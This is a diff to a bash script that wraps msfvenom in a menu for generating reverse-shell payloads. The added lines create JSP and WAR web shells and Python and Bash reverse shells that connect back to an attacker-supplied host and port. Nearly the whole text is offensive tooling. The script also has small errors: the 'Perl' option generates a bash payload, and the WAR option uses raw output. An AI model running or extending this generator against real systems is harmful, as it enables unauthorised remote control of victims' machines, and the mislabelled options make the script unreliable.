@@ -78,6 +78,47 @@ echo "ASP Payload"
 read -p "Output-filename(file.asp)~: " outputasp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > $outputasp
 ;;
+
+2)
+echo "JSP Payload"
+read -p "Output-filename(file.jsp)~: " outputjsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $outputjsp
+;;
+
+3)
+echo "WAR Payload"
+read -p "Output-filename(file.war)~: " outputwar
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $outputwar
+;;
+esac
+
+elif [ "$choice" -eq 4 ]
+then
+echo "Options: 
+Option 1:Python[0]
+===============
+Option 2:Bash[1]
+===============
+Option 3:Perl[2]
+===============
+"
+read -p "Option~: " option4
+case $option4 in
+0)
+echo  "Python Reverse-Shell"
+read -p "Output-filename(file.py)~: " outputpy
+msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port -f raw > $outputpy
+;;
+1)
+echo "Bash Shell Payload"
+read -p "Output-filename(file.sh)~: " outputsh
+msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > $outputsh
+;;
+2)
+echo "Perl Shell Payload"
+read -p "Output-filename(file.sh)~: " outputpl
+msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > $outputpl
+;;
 esac
 fi
 }
@@ -87,3 +128,4 @@ banner
 payload
 }
 main
+      
